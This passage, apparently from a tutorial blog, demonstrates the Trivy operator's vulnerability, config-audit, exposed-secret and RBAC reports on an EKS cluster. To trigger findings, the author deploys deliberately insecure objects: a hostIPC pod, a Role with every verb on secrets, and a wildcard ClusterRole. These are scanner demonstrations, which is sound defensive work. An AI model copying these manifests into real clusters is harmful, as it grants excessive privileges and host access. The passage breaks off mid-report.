Trivy 4m33s 3 18 39 0 0 Examine the VulnerabilityReports, which represent the latest vulnerabilities found in a container image of a given Kubernetes workload. Each report consists of a list of OS package and application vulnerabilities, with a summary of vulnerabilities grouped by severity. kubectl describe vulnerabilityreports -n test-trivy1 Name: pod-nginx-nginx Namespace: test-trivy1 Labels: resource-spec-hash=5b79d7b777 trivy-operator.container.name=nginx trivy-operator.resource.kind=Pod trivy-operator.resource.name=nginx trivy-operator.resource.namespace=test-trivy1 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: VulnerabilityReport Metadata: Creation Timestamp: 2023-03-14T04:28:11Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:28:11Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Pod Name: nginx UID: c879915a-7f0a-4ac1-a507-c9c47e69aa42 Resource Version: 114086 UID: 7531bd9b-2fe2-40cd-9223-280af46bebec Report: Artifact: Repository: library/nginx Tag: 1.22.0 Registry: Server: index.docker.io Scanner: Name: Trivy Vendor: Aqua Security Version: 0.38.2 Summary: Critical Count: 3 High Count: 18 Low Count: 0 Medium Count: 39 None Count: 0 Unknown Count: 0 Update Timestamp: 2023-03-14T04:28:11Z Vulnerabilities: Fixed Version: 7.74.0-1.3+deb11u5 Installed Version: 7.74.0-1.3+deb11u3 Links: Primary Link: https://avd.aquasec.com/nvd/cve-2022-32221 Resource: curl Score: 4.8 Severity: CRITICAL Target: Title: curl: POST following PUT confusion Vulnerability ID: CVE-2022-32221 Fixed Version: 7.74.0-1.3+deb11u7 Installed Version: 7.74.0-1.3+deb11u3 Links: Primary Link: https://avd.aquasec.com/nvd/cve-2023-23916 Resource: curl Score: 6.5 Severity: HIGH Target: Title: curl: HTTP multi-header compression denial of service Vulnerability ID: CVE-2023-23916 Fixed Version: 7.74.0-1.3+deb11u5 Installed Version: 7.74.0-1.3+deb11u3 Links: Primary Link: https://avd.aquasec.com/nvd/cve-2022-43552 Resource: curl Score: 5.9 Severity: MEDIUM ... You can easily obtain a list of container image vulnerabilities for the entire cluster: kubectl get vulnerabilityreports --all-namespaces -o wide NAMESPACE NAME REPOSITORY TAG SCANNER AGE CRITICAL HIGH MEDIUM LOW UNKNOWN cert-manager replicaset-6bdbc5f78f jetstack/cert-manager-cainjector v1.11.0 Trivy 12m 0 1 0 0 0 cert-manager replicaset-cert-manager-68784d64d7-cert-manager-controller jetstack/cert-manager-controller v1.11.0 Trivy 12m 0 1 0 0 0 cert-manager replicaset-cert-manager-webhook-6787f645b9-cert-manager-webhook jetstack/cert-manager-webhook v1.11.0 Trivy 13m 0 1 0 0 0 external-dns replicaset-external-dns-58995955b-external-dns external-dns/external-dns v0.13.2 Trivy 12m 0 13 4 0 0 forecastle replicaset-forecastle-7b645d64bf-forecastle stakater/forecastle v1.0.121 Trivy 12m 0 1 1 0 0 ingress-nginx replicaset-ingress-nginx-controller-f958b4d8d-controller ingress-nginx/controller Trivy 12m 2 3 2 0 0 karpenter replicaset-karpenter-565b558f9-controller karpenter/controller Trivy 12m 0 0 0 0 0 kube-prometheus-stack daemonset-6c9bb4f54f prometheus/node-exporter v1.5.0 Trivy 13m 0 1 1 0 0 kube-prometheus-stack replicaset-56c596c9bb curlimages/curl 7.85.0 Trivy 13m 0 6 3 0 0 kube-prometheus-stack replicaset-5b5d6f8fb8 kiwigrid/k8s-sidecar 1.22.0 Trivy 13m 0 7 2 0 0 kube-prometheus-stack replicaset-64556849bd prometheus-operator/prometheus-operator v0.63.0 Trivy 12m 0 1 1 0 0 kube-prometheus-stack replicaset-79cd99d94 kiwigrid/k8s-sidecar 1.22.0 Trivy 13m 0 7 2 0 0 kube-prometheus-stack replicaset-d894b795d kube-state-metrics/kube-state-metrics v2.8.1 Trivy 13m 0 1 0 0 0 kube-prometheus-stack replicaset-kube-prometheus-stack-grafana-646bc57bb6-grafana grafana/grafana 9.3.8 Trivy 13m 0 2 3 0 0 kube-prometheus-stack statefulset-55c7d87c7d prometheus-operator/prometheus-config-reloader v0.63.0 Trivy 13m 0 0 0 0 0 kube-prometheus-stack statefulset-646865b49b prometheus-operator/prometheus-config-reloader v0.63.0 Trivy 13m 0 0 0 0 0 kube-prometheus-stack statefulset-6547f6bbc9 prometheus/prometheus v2.42.0 Trivy 13m 0 2 0 0 0 kube-prometheus-stack statefulset-6ddfb59cf5 prometheus-operator/prometheus-config-reloader v0.63.0 Trivy 13m 0 0 0 0 0 kube-prometheus-stack statefulset-758c4b8b8 prometheus/alertmanager v0.25.0 Trivy 13m 0 2 0 0 0 kube-system daemonset-6b8684d996 aws-ec2/aws-node-termination-handler v1.19.0 Trivy 13m 0 2 1 0 0 kube-system replicaset-metrics-server-7df9d78f65-metrics-server metrics-server/metrics-server v0.6.2 Trivy 12m 1 3 2 0 0 mailhog replicaset-mailhog-6f54fccf85-mailhog cd2team/mailhog 1663459324 Trivy 13m 0 6 2 0 0 oauth2-proxy replicaset-oauth2-proxy-f5f86cd5d-oauth2-proxy oauth2-proxy/oauth2-proxy v7.4.0 Trivy 12m 0 8 3 0 0 test-trivy1 pod-nginx-nginx library/nginx 1.22.0 Trivy 12m 3 18 39 0 0 trivy-system replicaset-trivy-operator-56bdc96f8-trivy-operator aquasecurity/trivy-operator 0.12.1 Trivy 13m 0 0 0 0 0 Compliance Reports I will deploy a pod with hostIPC: true and then examine the compliance report. Links: CIS Kubernetes Benchmark Bad Pod #7: HOSTIPC Only Center for Internet Security Here is a list of the supported Compliance Reports: kubectl get clustercompliancereports NAME AGE cis 15m nsa 15m pss-baseline 15m pss-restricted 15m We are currently interested in the CIS Kubernetes Benchmark and specifically the control to ‚ÄúMinimize the admission of containers wishing to share the host IPC namespace‚Äù: kubectl get clustercompliancereports cis -o json | jq '.spec.compliance.controls[] | select(.name==\"Minimize the admission of containers wishing to share the host IPC namespace\")' { \"checks\": [ { \"id\": \"AVD-KSV-0008\" } ], \"description\": \"Do not generally permit containers to be run with the hostIPC flag set to true\", \"id\": \"5.2.4\", \"name\": \"Minimize the admission of containers wishing to share the host IPC namespace\", \"severity\": \"HIGH\" } Let‚Äôs create a new namespace with a pod that has the hostIPC: true parameter present in its Kubernetes YAML manifest: kubectl create namespace test-trivy2 kubectl apply --namespace=test-trivy2 -f - &lt;&lt; \\EOF apiVersion: v1 kind: Pod metadata: name: hostipc-exec-pod labels: app: pentest spec: automountServiceAccountToken: false hostIPC: true # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; This is the security issue containers: - name: hostipc-pod image: k8s.gcr.io/pause:3.6 resources: requests: memory: \"1Mi\" cpu: \"1m\" limits: memory: \"16Mi\" cpu: \"20m\" securityContext: allowPrivilegeEscalation: false capabilities: drop: - ALL readOnlyRootFilesystem: true runAsGroup: 30000 runAsNonRoot: true runAsUser: 20000 seccompProfile: type: RuntimeDefault EOF echo -n \"Waiting for trivy-operator to create ConfigAuditReports: \" until kubectl get configauditreports -n test-trivy2 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 5 done An instance of the ConfigAuditReports resource represents checks performed by Trivy against a Kubernetes object‚Äôs configuration. The introduced security issue is visible in the ConfigAuditReports: kubectl describe configauditreports -n test-trivy2 Name: pod-hostipc-exec-pod Namespace: test-trivy2 Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=7f9b85d646 trivy-operator.resource.kind=Pod trivy-operator.resource.name=hostipc-exec-pod trivy-operator.resource.namespace=test-trivy2 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: ConfigAuditReport Metadata: Creation Timestamp: 2023-03-14T04:41:51Z Generation: 2 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:41:53Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Pod Name: hostipc-exec-pod UID: c1b84929-b947-452c-95b4-d1fc2f8dc11d Resource Version: 117561 UID: 5deb58ae-b18d-4c85-b757-5e877c3abeae Report: Checks: Category: Kubernetes Security Check Check ID: KSV008 Description: Sharing the host's IPC namespace allows container processes to communicate with processes on the host. Messages: Pod 'hostipc-exec-pod' should not set 'spec.template.spec.hostIPC' to true Severity: HIGH Success: false Title: Access to host IPC namespace Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 0 High Count: 1 Low Count: 0 Medium Count: 0 Update Timestamp: 2023-03-14T04:41:53Z Events: &lt;none&gt; As in the previous example, you can see the compliance report for the entire cluster: kubectl get configauditreports --all-namespaces -o wide NAMESPACE NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW cert-manager replicaset-cert-manager-68784d64d7 Trivy 16m 0 0 0 7 cert-manager replicaset-cert-manager-cainjector-547c9b8f95 Trivy 15m 0 0 0 7 cert-manager replicaset-cert-manager-webhook-6787f645b9 Trivy 14m 0 0 0 7 cert-manager service-cert-manager Trivy 14m 0 0 0 0 cert-manager service-cert-manager-webhook Trivy 15m 0 0 0 0 default service-kubernetes Trivy 14m 0 0 0 1 external-dns replicaset-external-dns-58995955b Trivy 16m 0 0 1 6 external-dns service-external-dns Trivy 15m 0 0 0 0 forecastle replicaset-forecastle-7b645d64bf Trivy 15m 0 0 2 10 forecastle service-forecastle Trivy 15m 0 0 0 0 ingress-nginx replicaset-ingress-nginx-controller-f958b4d8d Trivy 15m 0 0 3 6 ingress-nginx service-ingress-nginx-controller Trivy 14m 0 0 0 0 ingress-nginx service-ingress-nginx-controller-admission Trivy 15m 0 0 0 0 ingress-nginx service-ingress-nginx-controller-metrics Trivy 15m 0 0 0 0 karpenter replicaset-karpenter-565b558f9 Trivy 15m 0 0 2 10 karpenter service-karpenter Trivy 15m 0 0 0 0 kube-prometheus-stack daemonset-kube-prometheus-stack-prometheus-node-exporter Trivy 15m 0 3 2 10 kube-prometheus-stack replicaset-kube-prometheus-stack-grafana-646bc57bb6 Trivy 14m 0 0 8 34 kube-prometheus-stack replicaset-kube-prometheus-stack-kube-state-metrics-5979d9d98c Trivy 16m 0 0 2 10 kube-prometheus-stack replicaset-kube-prometheus-stack-operator-5df65d688f Trivy 15m 0 0 0 9 kube-prometheus-stack service-alertmanager-operated Trivy 14m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-alertmanager Trivy 16m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-grafana Trivy 15m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-kube-state-metrics Trivy 16m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-operator Trivy 16m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-prometheus Trivy 14m 0 0 0 0 kube-prometheus-stack service-kube-prometheus-stack-prometheus-node-exporter Trivy 14m 0 0 0 0 kube-prometheus-stack service-prometheus-operated Trivy 14m 0 0 0 0 kube-prometheus-stack statefulset-alertmanager-kube-prometheus-stack-alertmanager Trivy 16m 0 0 0 8 kube-prometheus-stack statefulset-prometheus-kube-prometheus-stack-prometheus Trivy 16m 0 0 0 11 kube-system daemonset-aws-node Trivy 16m 0 3 7 17 kube-system daemonset-aws-node-termination-handler Trivy 15m 0 1 2 9 kube-system daemonset-ebs-csi-node Trivy 15m 0 1 8 12 kube-system daemonset-ebs-csi-node-windows Trivy 16m 0 0 8 14 kube-system daemonset-kube-proxy Trivy 16m 0 2 4 9 kube-system replicaset-coredns-7975d6fb9b Trivy 14m 0 0 3 5 kube-system replicaset-ebs-csi-controller-646b59c99 Trivy 15m 0 0 1 20 kube-system replicaset-metrics-server-7df9d78f65 Trivy 15m 0 0 1 9 kube-system service-kube-dns Trivy 15m 0 0 1 0 kube-system service-kube-prometheus-stack-coredns Trivy 14m 0 0 1 0 kube-system service-kube-prometheus-stack-kubelet Trivy 14m 0 0 1 0 kube-system service-metrics-server Trivy 14m 0 0 1 0 mailhog replicaset-mailhog-6f54fccf85 Trivy 14m 0 0 0 7 mailhog service-mailhog Trivy 16m 0 0 0 0 oauth2-proxy replicaset-oauth2-proxy-f5f86cd5d Trivy 15m 0 0 2 10 oauth2-proxy service-oauth2-proxy Trivy 14m 0 0 0 0 test-trivy1 pod-nginx Trivy 15m 0 0 3 10 test-trivy2 pod-hostipc-exec-pod Trivy 59s 0 1 0 0 trivy-system replicaset-trivy-operator-56bdc96f8 Trivy 14m 0 0 1 7 trivy-system service-trivy-operator Trivy 15m 0 0 0 0 Exposed Secrets Report An ExposedSecretReport represents secrets found in a container image of a given Kubernetes workload. Consider an example of a container that has SSH keys embedded within it: kubectl create namespace test-trivy3 kubectl run ubuntu-sshd-exposed-secrets --namespace=test-trivy3 --image=peru/ubuntu_sshd --overrides='{\"spec\": { \"nodeSelector\": {\"kubernetes.io/arch\": \"amd64\"}}}' echo -n \"Waiting for trivy-operator to create ExposedSecretReports: \" until kubectl get exposedsecretreports -n test-trivy3 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 3 done After examining the ExposedSecretReport details, it should be easy to identify the problem: kubectl describe exposedsecretreport -n test-trivy3 Name: pod-ubuntu-sshd-exposed-secrets-ubuntu-sshd-exposed-secrets Namespace: test-trivy3 Labels: resource-spec-hash=b9d794b6b trivy-operator.container.name=ubuntu-sshd-exposed-secrets trivy-operator.resource.kind=Pod trivy-operator.resource.name=ubuntu-sshd-exposed-secrets trivy-operator.resource.namespace=test-trivy3 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: ExposedSecretReport Metadata: Creation Timestamp: 2023-03-14T04:44:08Z Generation: 2 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:44:38Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Pod Name: ubuntu-sshd-exposed-secrets UID: d3a57ab4-e187-4e76-8691-2a97ef293c62 Resource Version: 118720 UID: 23a924b1-ac50-4cc9-957b-6b28ad504b65 Report: Artifact: Repository: peru/ubuntu_sshd Tag: latest Registry: Server: index.docker.io Scanner: Name: Trivy Vendor: Aqua Security Version: 0.38.2 Secrets: Category: AsymmetricPrivateKey Match: ----BEGIN RSA PRIVATE KEY-----**********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************-----END RSA PRIVATE Rule ID: private-key Severity: HIGH Target: /etc/ssh/ssh_host_rsa_key Title: Asymmetric Private Key Category: AsymmetricPrivateKey Match: -----BEGIN EC PRIVATE KEY-----************************************************************************************************************************************************************************-----END EC PRIVATE Rule ID: private-key Severity: HIGH Target: /etc/ssh/ssh_host_ecdsa_key Title: Asymmetric Private Key Category: AsymmetricPrivateKey Match: BEGIN OPENSSH PRIVATE KEY-----******************************************************************************************************************************************************************************************************************************************************************************************************************************************************-----END OPENSSH PRI Rule ID: private-key Severity: HIGH Target: /etc/ssh/ssh_host_ed25519_key Title: Asymmetric Private Key Summary: Critical Count: 0 High Count: 3 Low Count: 0 Medium Count: 0 Update Timestamp: 2023-03-14T04:44:38Z Events: &lt;none&gt; A cluster-wide output will show us the complete picture of exposed secrets: kubectl get exposedsecretreport -n test-trivy3 -o wide NAME REPOSITORY TAG SCANNER AGE CRITICAL HIGH MEDIUM LOW pod-ubuntu-sshd-exposed-secrets-ubuntu-sshd-exposed-secrets peru/ubuntu_sshd latest Trivy 99s 0 3 0 0 RBAC Assessment Report The RBAC Assessment Report exists in two ‚Äúversions‚Äù (Custom Resource Definitions - CRDs): RbacAssessmentReport ClusterRbacAssessmentReport RbacAssessmentReport Let‚Äôs consider an example with a role that allows manipulation and reading of secrets: kubectl create namespace test-trivy4 kubectl apply --namespace=test-trivy4 -f - &lt;&lt; \\EOF apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: secret-reader rules: - apiGroups: [\"\"] resources: [\"secrets\"] verbs: [\"*\"]# &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; This is the security issue EOF echo -n \"Waiting for trivy-operator to create RbacAssessmentReport: \" until kubectl get rbacassessmentreport -n test-trivy4 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 3 done The generated RbacAssessmentReport will contain a CRITICAL issue related to secret management: kubectl describe rbacassessmentreport --namespace test-trivy4 Name: role-secret-reader Namespace: test-trivy4 Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=6f775df776 trivy-operator.resource.kind=Role trivy-operator.resource.name=secret-reader trivy-operator.resource.namespace=test-trivy4 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: RbacAssessmentReport Metadata: Creation Timestamp: 2023-03-14T04:46:33Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:46:33Z Owner References: API Version: rbac.authorization.k8s.io/v1 Block Owner Deletion: false Controller: true Kind: Role Name: secret-reader UID: d97c0dc5-6d81-440a-9bc3-6e7c3621635c Resource Version: 119225 UID: 6b9a7b0f-768e-4487-b288-538433e2045d Report: Checks: Category: Kubernetes Security Check Check ID: KSV045 Description: Check whether role permits wildcard verb on specific resources Messages: Role permits wildcard verb on specific resources Severity: CRITICAL Success: false Title: No wildcard verb roles Category: Kubernetes Security Check Check ID: KSV041 Description: Check whether role permits managing secrets Messages: Role permits management of secret(s) Severity: CRITICAL Success: false Title: Do not allow management of secrets Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 2 High Count: 0 Low Count: 0 Medium Count: 0 Events: &lt;none&gt; You can also view all ‚ÄúRole issues‚Äù in the cluster: kubectl get rbacassessmentreport --all-namespaces --output=wide NAMESPACE NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW cert-manager role-565fd84cf Trivy 21m 1 0 0 0 default role-864ddd97cb Trivy 19m 0 1 0 1 ingress-nginx role-ingress-nginx Trivy 20m 1 0 0 0 karpenter role-karpenter Trivy 19m 1 0 1 0 kube-prometheus-stack role-kube-prometheus-stack-grafana Trivy 19m 0 0 0 0 kube-public role-b99d4b8d7 Trivy 20m 0 0 1 0 kube-system role-54bf889b86 Trivy 19m 0 0 1 0 kube-system role-5c6cd5c956 Trivy 19m 0 0 0 0 kube-system role-5cc59f98f6 Trivy 19m 0 0 0 0 kube-system role-5df4dbbd98 Trivy 19m 0 0 1 0 kube-system role-668d4b4c7b Trivy 20m 0 2 1 0 kube-system role-6fbccbcb9d Trivy 19m 0 0 1 0 kube-system role-77cd64c645 Trivy 19m 0 0 1 0 kube-system role-79f88497 Trivy 19m 0 0 1 0 kube-system role-7f4d588ff9 Trivy 18m 0 0 0 0 kube-system role-8498b9b6d4 Trivy 19m 0 0 1 0 kube-system role-864ddd97cb Trivy 20m 0 0 0 0 kube-system role-868458b9d6 Trivy 20m 1 0 0 0 kube-system role-8c86c9467 Trivy 19m 0 0 0 0 kube-system role-b99d4b8d7 Trivy 19m 1 0 0 0 kube-system role-eks-vpc-resource-controller-role Trivy 19m 0 0 1 0 kube-system role-extension-apiserver-authentication-reader Trivy 19m 0 0 0 0 kube-system role-karpenter-dns Trivy 20m 0 0 0 0 test-trivy4 role-secret-reader Trivy 49s 2 0 0 0 trivy-system role-trivy-operator Trivy 21m 1 0 1 0 trivy-system role-trivy-operator-leader-election Trivy 19m 0 0 0 0 ClusterRbacAssessmentReport Creating the following ClusterRole will cause another security violation against the principle of least privilege. kubectl apply -f - &lt;&lt; \\EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: wildcard-resource rules: - apiGroups: [\"\"] resources: [\"*\"] # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; This is the security issue verbs: [\"*\"] EOF echo -n \"Waiting for trivy-operator to create ClusterRbacAssessmentReport: \" until kubectl get clusterrbacassessmentreport clusterrole-wildcard-resource 2&gt; /dev/null; do echo -n \".\" sleep 3 done See the details below: kubectl describe clusterrbacassessmentreport clusterrole-wildcard-resource Name: clusterrole-wildcard-resource Namespace: Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=6c64bd7d7 trivy-operator.resource.kind=ClusterRole trivy-operator.resource.name=wildcard-resource trivy-operator.resource.namespace= Annotations: &lt;none&gt; API Version: aquasecurity.github.io/v1alpha1 Kind: ClusterRbacAssessmentReport Metadata: Creation Timestamp: 2023-03-14T04:47:57Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:47:57Z Owner References: API Version: rbac.authorization.k8s.io/v1 Block Owner Deletion: false Controller: true Kind: ClusterRole Name: wildcard-resource UID: ef842392-d8cc-47c9-b60d-8a713232596b Resource Version: 119581 UID: 1fc1eb0a-7ad4-4ee9-9e1a-725847e2ed11 Report: Checks: Category: Kubernetes Security Check Check ID: KSV046 Description: Check whether role permits specific verb on wildcard resources Messages: Role permits specific verb on wildcard resource Severity: CRITICAL Success: false Title: No wildcard resource roles Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 1 High Count: 0 Low Count: 0 Medium Count: 0 Events: &lt;none&gt; View all ‚ÄúClusterRole issues‚Äù in the cluster: kubectl get clusterrbacassessmentreport --all-namespaces --output=wide NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW clusterrole-54bb85d744 Trivy 20m 0 0 0 0 clusterrole-54bf889b86 Trivy 21m 0 0 0 0 clusterrole-54ccb57cc4 Trivy 20m 0 0 0 0 clusterrole-54cdc9b678 Trivy 21m 1 0 0 0 clusterrole-5585c7b9ff Trivy 19m 0 0 0 0 clusterrole-565cd5fdf Trivy 19m 0 0 0 0 clusterrole-567cc86fc6 Trivy 19m 0 0 0 0 clusterrole-569d87574c Trivy 22m 1 0 0 0 clusterrole-575b7f6784 Trivy 20m 0 0 0 0 clusterrole-57d745d4cc Trivy 23m 1 0 0 0 clusterrole-5857f84f59 Trivy 21m 0 0 0 0 clusterrole-58bfc7788d Trivy 20m 0 0 0 0 clusterrole-59dc5c9cb6 Trivy 19m 0 0 0 0 clusterrole-5b458986c5 Trivy 19m 0 0 0 0 clusterrole-5b97d66885 Trivy 20m 0 0 0 0 clusterrole-5bd7cc878d Trivy 19m 0 0 0 0 clusterrole-5c6cd5c956 Trivy 20m 0 0 0 0 clusterrole-5cbfdf6f9d Trivy 21m 0 0 0 0 clusterrole-5f9f8f6b4c Trivy 21m 1 0 0 0 clusterrole-644b85fbb5 Trivy 21m 0 0 0 0 clusterrole-6496b874bc Trivy 20m 0 0 0 0 clusterrole-64cd5dd8c5 Trivy 19m 0 0 0 0 clusterrole-64f9898979 Trivy 21m 0 0 0 0 clusterrole-658cbf7c48 Trivy 19m 0 0 0 0 clusterrole-6594cc4fb6 Trivy 19m 0 1 0 0 clusterrole-65bd45754b Trivy 20m 0 0 0 0 clusterrole-65ff89d4f6 Trivy 19m 0 0 0 0 clusterrole-668d4b4c7b Trivy 19m 2 0 0 0 clusterrole-679f75d6b5 Trivy 21m 0 0 0 0 clusterrole-6858fccb98 Trivy 21m 0 0 0 0 clusterrole-68679985fd Trivy 19m 0 0 0 0 clusterrole-69c4fbc9c4 Trivy 20m 1 0 0 0 clusterrole-6b696dd9d5 Trivy 20m 0 0 0 0 clusterrole-6b6f997745 Trivy 20m 0 0 0 0 clusterrole-6c9cb84f7b Trivy 20m 0 0 0 0 clusterrole-6d7d6f9d9c Trivy 22m 0 1 0 0 clusterrole-6f54fcfddd Trivy 20m 0 0 0 0 clusterrole-6f647d9bdc Trivy 20m 0 0 0 0 clusterrole-6f69bb5b79 Trivy 21m 0 0 0 0 clusterrole-74586d59d6 Trivy 20m 0 0 1 0 clusterrole-74f98bf848 Trivy 20m 0 0 0 0 clusterrole-7557d9789b Trivy 20m 0 0 0 0 clusterrole-75f5d55dd8 Trivy 21m 0 0 0 0 clusterrole-76c6b6cf99 Trivy 19m 0 0 0 0 clusterrole-77898f44f5 Trivy 21m 0 1 0 0 clusterrole-779895897b Trivy 21m 0 0 0 0 clusterrole-779f88d9b5 Trivy 21m 0 1 0 0 clusterrole-77f88d49d Trivy 23m 0 0 0 0 clusterrole-79d4fc89cd Trivy 22m 1 0 0 0 clusterrole-79ff87886f Trivy 20m 0 0 0 0 clusterrole-7b884bc5d8 Trivy 21m 1 2 1 0 clusterrole-7bdcc749f8 Trivy 19m 0 1 0 0 clusterrole-7c4d8f665 Trivy 19m 1 1 0 0 clusterrole-7c5d4b78b6 Trivy 20m 0 1 0 0 clusterrole-7c7649d468 Trivy 22m 0 0 0 0 clusterrole-7dfccfdf Trivy 19m 0 0 0 0 clusterrole-7f76ddfb76 Trivy 20m 0 0 0 0 clusterrole-7f7cc8689f Trivy 20m 0 0 0 0 clusterrole-7ff7dbc7fd Trivy 20m 0 0 0 0 clusterrole-8498b9b6d4 Trivy 20m 0 0 0 0 clusterrole-8545bb4f4d Trivy 20m 0 0 0 0 clusterrole-865d464ff8 Trivy 20m 0 0 0 0 clusterrole-8686d64c5 Trivy 19m 0 1 0 0 clusterrole-8689f7c759 Trivy 21m 0 0 0 0 clusterrole-86ccd5dd47 Trivy 20m 1 0 0 0 clusterrole-889f4b7cc Trivy 20m 0 0 0 0 clusterrole-8b7445588 Trivy 22m 0 0 0 0 clusterrole-96685f56d Trivy 20m 0 1 0 0 clusterrole-984fc85d Trivy 21m 0 1 0 0 clusterrole-9d8f67c6d Trivy 20m 0 0 0 0 clusterrole-admin Trivy 20m 2 2 1 0 clusterrole-aggregate-config-audit-reports-view Trivy 20m 0 0 0 0 clusterrole-aggregate-exposed-secret-reports-view Trivy 20m 0 0 0 0 clusterrole-aggregate-vulnerability-reports-view Trivy 20m 0 0 0 0 clusterrole-aws-node Trivy 19m 1 0 0 0 clusterrole-aws-node-termination-handler Trivy 20m 0 0 0 0 clusterrole-b754c4cc6 Trivy 20m 2 1 0 0 clusterrole-bf7d9ff77 Trivy 21m 0 0 1 0 clusterrole-c497699bd Trivy 20m 0 0 0 0 clusterrole-cert-manager-cainjector Trivy 19m 1 0 0 0 clusterrole-cert-manager-controller-certificates Trivy 19m 1 0 0 0 clusterrole-cert-manager-controller-certificatesigningrequests Trivy 20m 0 0 0 0 clusterrole-cert-manager-controller-challenges Trivy 20m 1 1 0 0 clusterrole-cert-manager-controller-clusterissuers Trivy 19m 1 0 0 0 clusterrole-cert-manager-controller-ingress-shim Trivy 21m 0 0 0 0 clusterrole-cert-manager-controller-issuers Trivy 20m 1 0 0 0 clusterrole-cert-manager-controller-orders Trivy 19m 1 0 0 0 clusterrole-cert-manager-edit Trivy 21m 0 0 0 0 clusterrole-cert-manager-view Trivy 20m 0 0 0 0 clusterrole-cf7d59df5 Trivy 19m 0 0 0 0 clusterrole-cluster-admin Trivy 22m 2 0 0 0 clusterrole-d6d6b6c99 Trivy 19m 0 0 0 0 clusterrole-df67d86bd Trivy 19m 0 1 0 0 clusterrole-ebs-csi-node-role Trivy 20m 0 0 0 0 clusterrole-ebs-external-attacher-role Trivy 19m 0 0 0 0 clusterrole-ebs-external-provisioner-role Trivy 19m 0 0 0 0 clusterrole-ebs-external-resizer-role Trivy 20m 0 0 0 0 clusterrole-ebs-external-snapshotter-role Trivy 20m 0 0 0 0 clusterrole-edit Trivy 20m 1 2 1 0 clusterrole-external-dns Trivy 20m 0 0 0 0 clusterrole-f44d6476f Trivy 19m 0 0 0 0 clusterrole-forecastle-cluster-ingress-role Trivy 20m 0 0 0 0 clusterrole-ingress-nginx Trivy 19m 1 0 0 0 clusterrole-karpenter Trivy 19m 0 0 0 0 clusterrole-karpenter-admin Trivy 20m 0 0 0 0 clusterrole-karpenter-core Trivy 20m 0 0 0 0 clusterrole-kube-prometheus-stack-grafana-clusterrole Trivy 20m 1 0 0 0 clusterrole-kube-prometheus-stack-kube-state-metrics Trivy 19m 1 0 0 0 clusterrole-kube-prometheus-stack-operator Trivy 19m 2 2 1 0 clusterrole-kube-prometheus-stack-prometheus Trivy 21m 0 0 0 0 clusterrole-trivy-operator Trivy 21m 1 1 0 0 clusterrole-view Trivy 21m 0 0 0 0 clusterrole-vpc-resource-controller-role Trivy 23m 0 0 0 0 clusterrole-wildcard-resource Trivy 97s 1 0 0 0 Cluster Infra Assessment Reports Cluster Infra Assessment Reports should help you with hardening your Kubernetes cluster. Since I‚Äôm using Amazon EKS (a managed service), I‚Äôm not sure how useful this report is in this context, but I will test it for reference. View a cluster summary of node issues: kubectl get clusterinfraassessmentreports -o wide NAME SCANNER AGE CRITICAL HIGH MEDIUM LOW node-ip-192-168-12-204.ec2.internal Trivy 23m 5 5 0 0 node-ip-192-168-77-76.ec2.internal Trivy 6m5s 5 5 0 0 node-ip-192-168-8-119.ec2.internal Trivy 24m 5 5 0 0 Details about the nodes: NODE=$(kubectl get clusterinfraassessmentreports --no-headers=true -o custom-columns=\":metadata.name\" | head -1) kubectl describe clusterinfraassessmentreports \"${NODE}\" Name: node-ip-192-168-12-204.ec2.internal Namespace: Labels: plugin-config-hash=659b7b9c46 resource-spec-hash=54fdd9476 trivy-operator.resource.kind=Node trivy-operator.resource.name=ip-192-168-12-204.ec2.internal trivy-operator.resource.namespace= Annotations: &lt;none&gt; API Version: aquasecurity.github.io/v1alpha1 Kind: ClusterInfraAssessmentReport Metadata: Creation Timestamp: 2023-03-14T04:26:37Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 Fields Type: FieldsV1 ... Manager: trivy-operator Operation: Update Time: 